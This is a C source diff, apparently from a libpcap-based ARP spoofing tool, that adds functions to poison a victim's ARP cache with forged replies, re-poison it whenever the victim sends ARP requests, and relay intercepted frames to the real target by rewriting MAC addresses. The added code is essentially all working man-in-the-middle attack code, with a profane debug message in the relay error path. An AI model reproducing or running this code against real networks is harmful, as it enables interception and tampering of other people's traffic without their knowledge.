@@ -122,12 +122,109 @@ int GenArpPacket(struct ether_addr DMac, struct ether_addr SMac, uint16_t OpCode
 }
 
 int AttackPacket(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr LocalMac, struct in_addr TargetIP, struct in_addr SenderIP){
-    char *Genpacket = (char *)malloc(ETHER_MAX_LEN);
+    char* Genpacket = (char *)malloc(ETHER_MAX_LEN);
     uint32_t size;
     GenArpPacket(SenderMac,LocalMac,ARPOP_REPLY,TargetIP,LocalMac,SenderIP,SenderMac,&Genpacket,&size);
-    if(pcap_sendpacket(handle,(const u_char *)Genpacket,size)){
+    if(pcap_sendpacket(handle,(const u_char*)Genpacket,size)){
         return 0;
     }
     free(Genpacket);
     return 1;
+}
+
+
+int ArpSpoof(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr LocalMac, struct in_addr TargetIP, struct ether_addr TargetMac, struct in_addr SenderIP){
+    int32_t res;
+    struct pcap_pkthdr* pheader;
+    const u_char* packet;
+
+    if(AttackPacket(handle, SenderMac, LocalMac, TargetIP, SenderIP) != 1){
+        return 0;
+    }
+    printf("poisoning\n");
+
+    while( (res = pcap_next_ex(handle, &pheader, &packet)) >= 0){
+        /* time out */
+        if(res == 0)
+            continue;
+
+        switch (CheckPacket(packet, SenderMac, SenderIP, TargetIP)){
+            case 1: /* relay */
+                if(relay(handle, packet, LocalMac, SenderMac, TargetMac, pheader->caplen) != 1){
+                    printf("relay\n");
+                    return 0;
+                }
+                break;
+            case 2: /* poisoning */
+                printf("poisoning\n");
+                if(AttackPacket(handle, SenderMac, LocalMac, TargetIP, SenderIP) != 1){
+                    return 0;
+                }
+                break;
+        }
+    }
+}
+
+
+int CheckPacket(const u_char* packet, struct ether_addr shost, struct in_addr sIp, struct in_addr dIp){
+    struct ether_header* peth_hdr;
+    struct arphdr* parp_hdr;
+    struct arp_addr* parp_addr;
+
+    peth_hdr = (struct ether_header*) packet;
+
+    /* check is not from shost */
+    if(memcmp(peth_hdr->ether_shost, &shost, ETHER_ADDR_LEN))
+        return 0;
+
+    /* check is arp request */
+    if(peth_hdr->ether_type == htons(ETHERTYPE_ARP)){
+
+        parp_hdr = (struct arphdr*) (packet + sizeof(struct ether_header));
+
+        if(parp_hdr->ar_hrd == htons(ARPHRD_ETHER) &&
+                parp_hdr->ar_pro == htons(ETHERTYPE_IP) &&
+                parp_hdr->ar_hln == ETHER_ADDR_LEN &&
+                parp_hdr->ar_pln == IP_ADDRLEN &&
+                parp_hdr->ar_op == htons(ARPOP_REQUEST)){
+
+            parp_addr = (struct arp_addr*)(packet + sizeof(struct ether_header) + sizeof(struct arphdr));
+
+            if(!memcmp(&parp_addr->SenderIP, &sIp, IP_ADDRLEN) &&
+                    !memcmp(&parp_addr->TargetIP, &dIp, IP_ADDRLEN)){
+                return 2;
+            }
+        }
+    }
+    return 1;
+}
+
+int relay(pcap_t* handle, const u_char* packet, struct ether_addr LocalMac, struct ether_addr SenderMac, struct ether_addr TargetMac, uint32_t size){
+    struct ether_header* peth_hdr;
+
+    int i;
+    peth_hdr = (struct ether_header*) packet;
+
+    memcpy(peth_hdr->ether_shost, &LocalMac, ETHER_ADDR_LEN);
+    memcpy(peth_hdr->ether_dhost, &TargetMac, ETHER_ADDR_LEN);
+
+    if(pcap_sendpacket(handle, packet, size)){
+        printf("fuck fewiojfioawjeobijaiob %d\n",size);
+        for(i=0;i<size;i++)
+            printf("%02x ", packet[i] & 0xff);
+        return 0;
+    }
+    return 1;
+}
+
+int GetEtherIpLen(const u_char* packet){
+    struct ether_header* peth_hdr;
+    struct ip* pip;
+
+    peth_hdr = (struct ether_header*)packet;
+    if(peth_hdr->ether_type != htons(ETHERTYPE_IP))
+        return 0;
+    pip = (struct ip*)(packet + sizeof(struct ether_header));
+
+    return sizeof(struct ether_header) + htons(pip->ip_len);
 }
